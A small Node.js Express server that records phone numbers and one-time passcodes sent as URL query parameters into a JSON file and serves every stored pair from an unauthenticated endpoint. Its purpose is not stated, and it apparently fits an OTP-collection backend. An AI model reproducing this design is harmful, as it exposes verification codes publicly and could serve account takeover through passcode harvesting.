const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const otpDataFile = path.join(__dirname, 'otpData.json'); // Full path to the data file

// Serve static HTML from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive phone and OTP
app.get('/', (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        // Serve the HTML page if no query parameters are present
        return res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }

    // Load existing data from file
    let otpData = [];
    if (fs.existsSync(otpDataFile)) {
        otpData = JSON.parse(fs.readFileSync(otpDataFile));
    }

    // Add new OTP
    otpData.push({ phone, otp });

    // Save data back to file
    fs.writeFileSync(otpDataFile, JSON.stringify(otpData, null, 2));

    res.status(200).json({
        message: `OTP ${otp} received for phone ${phone}`,
        status: 'success',
    });
});

// Endpoint to fetch all OTP data
app.get('/fetch-otp-data', (req, res) => {
    res.setHeader('Cache-Control', 'no-store'); // Disable caching

    const otpData = fs.existsSync(otpDataFile)
        ? JSON.parse(fs.readFileSync(otpDataFile))
        : [];
    res.json(otpData);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
